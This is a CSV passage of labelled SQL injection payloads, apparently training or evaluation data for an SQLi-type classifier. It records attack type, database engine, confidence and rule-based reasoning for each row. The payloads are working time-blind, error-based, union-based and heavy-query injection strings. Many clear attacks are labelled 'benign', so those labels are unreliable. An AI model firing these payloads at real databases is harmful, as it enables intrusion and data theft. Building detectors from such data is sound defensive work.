id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
18354,"1%"" ) ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ( ""%"" = """,heavy_query,oracle,0.7,Payload contains token 'count(*) from 5 tables' → maps to heavy_query per priority table; DB signature → oracle. Heavy-query (P4): large cartesian/recursive workload used as time oracle without sleep().,1
18355,"1 ) ) as cusv where 4871 = 4871 and elt ( 1210 = 1210,sleep ( 5 ) ) --",time_blind,mysql,0.7,Payload contains token 'sleep(' → maps to time_blind per priority table; DB signature → mysql. Time-based blind injection (P5): the function induces measurable delay for inference.,1
18356,"1%"" ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( ""%"" = """,error_based,mysql,0.7,Payload contains token 'extractvalue' → maps to error_based per priority table; DB signature → mysql. Error-based (P4): the function forces a typecast/XPath error leaking data into the error string.,1
18357,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( ""weku"" like ""weku",heavy_query,generic,0.8,Payload contains token 'regexp_substring(repeat(...))' → maps to heavy_query per priority table; DB signature → generic. Heavy-query (P4): large cartesian/recursive workload used as time oracle without sleep().,2
18358,"1"" ) ) as ufba where 4049 = 4049",benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",2
18359,"1"" ) where 9447 = 9447",benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",2
18360,"1' ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( 'zpzf' = 'zpzf",heavy_query,generic,0.7,Payload contains token 'count(*) from 7 tables' → maps to heavy_query per priority table; DB signature → generic. Heavy-query (P4): large cartesian/recursive workload used as time oracle without sleep().,1
18361,end and ( 'rlux' like 'rlux,benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",2
18362,"1'|| ( select 'qsgi' where 1707 = 1707 or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) ) ||'",benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",1
18363,"1' ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( 'pmzp' like 'pmzp",error_based,mysql,0.7,Payload contains token 'extractvalue' → maps to error_based per priority table; DB signature → mysql. Error-based (P4): the function forces a typecast/XPath error leaking data into the error string.,1
18364,"1%' and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and '%' = '",heavy_query,generic,0.7,Payload contains token 'count(*) from 7 tables' → maps to heavy_query per priority table; DB signature → generic. Heavy-query (P4): large cartesian/recursive workload used as time oracle without sleep().,1
18365,"1"" ) ) as ljhz where 2416 = 2416",benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",2
18366,1'+ ( select ohqr where 5610 = 5610,benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",1
18367,if ( 8537 = 7034 ) select 8537 else drop function vqmp--,benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",1
18368,"1"" ) as zhlf where 4119 = 4119 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,oracle,0.7,Payload contains token 'count(*) from 5 tables' → maps to heavy_query per priority table; DB signature → oracle. Heavy-query (P4): large cartesian/recursive workload used as time oracle without sleep().,1
18369,"1' ) ) ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ( 'ofko' = 'ofko",benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",1
18370,-4607'|| ( select 'wkdg' where 7524 = 7524 order by 1--,benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",1
18371,"1' ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( 'vgkt' = 'vgkt",benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",1
18372,"1'|| ( select 'ymez' from dual where 9870 = 9870 or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",benign,oracle,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=oracle.",1
18373,"1 ) ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( ( 5524 = 5524",error_based,mysql,0.7,Payload contains token 'updatexml' → maps to error_based per priority table; DB signature → mysql. Error-based (P4): the function forces a typecast/XPath error leaking data into the error string.,1
18374,"1%"" or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ""%"" = """,union_based,mysql,0.7,Payload contains token 'union select' → maps to union_based per priority table; DB signature → mysql. Union-based (P7): UNION SELECT appends attacker-controlled columns to original result set.,1
18375,"1"" and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ""nzgn"" = ""nzgn",union_based,mysql,0.7,Payload contains token 'union select' → maps to union_based per priority table; DB signature → mysql. Union-based (P7): UNION SELECT appends attacker-controlled columns to original result set.,1
18376,"1%"" ) ) ) or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",1
18377,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( '%' = '",benign,oracle,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=oracle.",1
18378,"1"" ) where 1001 = 1001 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",error_based,mysql,0.8,"Payload contains token 'extractvalue', 'benchmark' → maps to error_based per priority table; DB signature → mysql. Error-based (P4): the function forces a typecast/XPath error leaking data into the error string.",2
18379,"1%"" ) ) ) or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,oracle,0.7,Payload contains token 'count(*) from 5 tables' → maps to heavy_query per priority table; DB signature → oracle. Heavy-query (P4): large cartesian/recursive workload used as time oracle without sleep().,1
18380,"1"" ) ) as tgwp where 9405 = 9405",benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",2
18381,"end and ""xouo"" like ""xouo",boolean_blind,generic,0.8,Payload contains token 'and ... like ...' → maps to boolean_blind per priority table; DB signature → generic. Boolean-based blind (P3): tautology/regex/elt branches yield true/false used to infer bits.,2
18382,"1' or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and 'yvzf' = 'yvzf",union_based,mysql,0.7,Payload contains token 'union select' → maps to union_based per priority table; DB signature → mysql. Union-based (P7): UNION SELECT appends attacker-controlled columns to original result set.,1
18383,1'|| ( select 'goen' from dual where 8586 = 8586,benign,oracle,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=oracle.",1
18384,if ( 5896 = 4251 ) select 5896 else drop function xmyk--,benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",1
18385,"1%"" ) ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ""%"" = """,benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",1
18386,"1' ) ) ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ( 'xdui' like 'xdui",heavy_query,oracle,0.7,Payload contains token 'count(*) from 5 tables' → maps to heavy_query per priority table; DB signature → oracle. Heavy-query (P4): large cartesian/recursive workload used as time oracle without sleep().,1
18387,-9202' where 9799 = 9799 or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --,benign,oracle,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=oracle.",1
18388,"1"" ) ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ""gxqq"" = ""gxqq",benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",1
18389,"1 or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )",heavy_query,firebird,0.7,Payload contains token 'count(*) from 4 tables' → maps to heavy_query per priority table; DB signature → firebird. Heavy-query (P4): large cartesian/recursive workload used as time oracle without sleep().,1
18390,"1 ) ) ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( ( ( 4510 = 4510",error_based,mysql,0.7,Payload contains token 'extractvalue' → maps to error_based per priority table; DB signature → mysql. Error-based (P4): the function forces a typecast/XPath error leaking data into the error string.,1
18391,"1'|| ( select 'svgd' from dual where 5188 = 5188 union all select null,null,null,null,null#",union_based,oracle,0.95,Payload contains token 'union all select' → maps to union_based per priority table; DB signature → oracle. Union-based (P7): UNION SELECT appends attacker-controlled columns to original result set.,3
18392,"1' or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and 'zenl' like 'zenl",error_based,mysql,0.7,Payload contains token 'exp(~)' → maps to error_based per priority table; DB signature → mysql. Error-based (P4): the function forces a typecast/XPath error leaking data into the error string.,1
18393,"1"" ) ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( ( ""mmsh"" = ""mmsh",error_based,mysql,0.7,Payload contains token 'updatexml' → maps to error_based per priority table; DB signature → mysql. Error-based (P4): the function forces a typecast/XPath error leaking data into the error string.,1
18394,1'+ ( select 'feof' where 1966 = 1966,benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",1
18395,"-3169"" order by 1#",benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",3
18396,"1' ) as najc where 5213 = 5213 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) --",error_based,mysql,0.8,"Payload contains token 'extractvalue', 'benchmark' → maps to error_based per priority table; DB signature → mysql. Error-based (P4): the function forces a typecast/XPath error leaking data into the error string.",2
18397,"1"" ) ) ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ( ( ""tabq"" like ""tabq",error_based,mysql,0.8,"Payload contains token 'extractvalue', 'benchmark' → maps to error_based per priority table; DB signature → mysql. Error-based (P4): the function forces a typecast/XPath error leaking data into the error string.",2
18398,"-3964"" ) where 3566 = 3566 order by 1--",benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",2
18399,"1%"" ) or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",heavy_query,firebird,0.7,Payload contains token 'count(*) from 4 tables' → maps to heavy_query per priority table; DB signature → firebird. Heavy-query (P4): large cartesian/recursive workload used as time oracle without sleep().,1
18400,"1"" procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ""dsae"" = ""dsae",error_based,mysql,0.8,Payload contains token 'extractvalue' → maps to error_based per priority table; DB signature → mysql. Error-based (P4): the function forces a typecast/XPath error leaking data into the error string.,2
18401,"1%' ) ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ( '%' = '",error_based,mysql,0.8,"Payload contains token 'extractvalue', 'benchmark' → maps to error_based per priority table; DB signature → mysql. Error-based (P4): the function forces a typecast/XPath error leaking data into the error string.",2
18402,"1"" or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ""gknn"" like ""gknn",error_based,mysql,0.7,Payload contains token 'extractvalue' → maps to error_based per priority table; DB signature → mysql. Error-based (P4): the function forces a typecast/XPath error leaking data into the error string.,1
18403,"1%' ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( '%' = '",heavy_query,oracle,0.7,Payload contains token 'count(*) from 5 tables' → maps to heavy_query per priority table; DB signature → oracle. Heavy-query (P4): large cartesian/recursive workload used as time oracle without sleep().,1
18404,end and ( ( 'vkle' = 'vkle,benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",2
18405,1 order by 1--,benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",3
18406,"1 ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( 1915 = 1915",time_blind,mysql,0.7,Payload contains token 'sleep(' → maps to time_blind per priority table; DB signature → mysql. Time-based blind injection (P5): the function induces measurable delay for inference.,1
18407,"1"" ) as rqpp where 9383 = 9383 or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",benign,db2,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=db2.",1
18408,"1' ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( 'xwsb' = 'xwsb",time_blind,mysql,0.7,Payload contains token 'sleep(' → maps to time_blind per priority table; DB signature → mysql. Time-based blind injection (P5): the function induces measurable delay for inference.,1
18409,1 ) ) as xmac where 7692 = 7692,benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",2
18410,"1 ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( 5098 = 5098",heavy_query,oracle,0.7,Payload contains token 'count(*) from 5 tables' → maps to heavy_query per priority table; DB signature → oracle. Heavy-query (P4): large cartesian/recursive workload used as time oracle without sleep().,1
18411,"1' ) as qaec where 6572 = 6572 or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",heavy_query,generic,0.7,Payload contains token 'count(*) from 7 tables' → maps to heavy_query per priority table; DB signature → generic. Heavy-query (P4): large cartesian/recursive workload used as time oracle without sleep().,1
18412,"1' ) as wpom where 2620 = 2620 and elt ( 3114 = 3114,sleep ( 5 ) ) #",time_blind,mysql,0.7,Payload contains token 'sleep(' → maps to time_blind per priority table; DB signature → mysql. Time-based blind injection (P5): the function induces measurable delay for inference.,1
18413,"1"" ) ) as xxdm where 4818 = 4818",benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",2
18414,"1"" ) ) as ltco where 3862 = 3862 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,oracle,0.7,Payload contains token 'count(*) from 5 tables' → maps to heavy_query per priority table; DB signature → oracle. Heavy-query (P4): large cartesian/recursive workload used as time oracle without sleep().,1
18415,"-2110' or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",1
18416,1'+ ( select iutk where 6158 = 6158,benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",1
18417,"1 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",benign,db2,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=db2.",1
18418,"1"" where 5334 = 5334 or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",error_based,mysql,0.7,Payload contains token 'exp(~)' → maps to error_based per priority table; DB signature → mysql. Error-based (P4): the function forces a typecast/XPath error leaking data into the error string.,1
18419,1'+ ( select ophz where 9158 = 9158 rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) ) +',time_blind,mysql,0.7,Payload contains token 'sleep(' → maps to time_blind per priority table; DB signature → mysql. Time-based blind injection (P5): the function induces measurable delay for inference.,1
18420,"-7248' ) where 4626 = 4626 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",1
18421,"1"" ) ) ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( ( ""adwg"" like ""adwg",heavy_query,firebird,0.7,Payload contains token 'count(*) from 4 tables' → maps to heavy_query per priority table; DB signature → firebird. Heavy-query (P4): large cartesian/recursive workload used as time oracle without sleep().,1
18422,"1' ) ) ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ( 'owot' = 'owot",benign,db2,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=db2.",1
18423,1'+ ( select qtyi where 7147 = 7147,benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",1
18424,1'|| ( select 'jlon' where 1461 = 1461,benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",1
18425,end if,benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",3
18426,"1'+ ( select sfuq where 8094 = 8094 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) ) +'",error_based,mysql,0.8,"Payload contains token 'extractvalue', 'benchmark' → maps to error_based per priority table; DB signature → mysql. Error-based (P4): the function forces a typecast/XPath error leaking data into the error string.",2
18427,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4-- sapi",heavy_query,firebird,0.7,Payload contains token 'count(*) from 4 tables' → maps to heavy_query per priority table; DB signature → firebird. Heavy-query (P4): large cartesian/recursive workload used as time oracle without sleep().,1
18428,"1"" or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )",heavy_query,oracle,0.7,Payload contains token 'count(*) from 5 tables' → maps to heavy_query per priority table; DB signature → oracle. Heavy-query (P4): large cartesian/recursive workload used as time oracle without sleep().,1
18429,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ( ( ""%"" = """,benign,db2,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=db2.",1
18430,"1' ) and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",benign,db2,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=db2.",1
18431,"-9929' ) as gbtc where 8162 = 8162 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",1
18432,"1'+ ( select rdpe where 6553 = 6553 or elt ( 6272 = 6272,sleep ( 5 ) ) ) +'",time_blind,mysql,0.7,Payload contains token 'sleep(' → maps to time_blind per priority table; DB signature → mysql. Time-based blind injection (P5): the function induces measurable delay for inference.,1
18433,"1"" ) where 1107 = 1107 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",benign,db2,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=db2.",1
18434,"-1588%"" ) ) ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",1
18435,( 2329 = 4209 ) *1,benign,generic,0.7,"No SQLi attack tokens found in payload; structure looks like plain SQL/text without unions, error funcs, time delays, or boolean tautologies; classified benign with db=generic.",3
18436,"1' ) where 1027 = 1027 and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",boolean_blind,mysql,0.8,Payload contains token 'elt(' → maps to boolean_blind per priority table; DB signature → mysql. Boolean-based blind (P3): tautology/regex/elt branches yield true/false used to infer bits.,2
18437,"1 ) ) or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",heavy_query,firebird,0.7,Payload contains token 'count(*) from 4 tables' → maps to heavy_query per priority table; DB signature → firebird. Heavy-query (P4): large cartesian/recursive workload used as time oracle without sleep().,1
